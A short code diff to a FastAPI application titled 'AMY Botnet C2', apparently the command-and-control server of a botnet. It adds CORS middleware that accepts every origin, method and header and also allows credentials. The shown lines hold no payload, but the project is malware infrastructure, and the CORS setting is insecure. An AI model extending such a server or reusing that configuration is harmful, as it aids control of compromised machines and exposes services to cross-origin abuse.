@@ -1,6 +1,7 @@
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.staticfiles import StaticFiles
+from fastapi.middleware.cors import CORSMiddleware
 import asyncio
 import base64
 import os
@@ -8,6 +9,15 @@ from datetime import datetime
 from pathlib import Path
 
 app = FastAPI(title="AMY Botnet C2")
+
+# Налаштування CORS
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 # Setup base directory
 BASE_DIR = Path(__file__).resolve().parent.parent
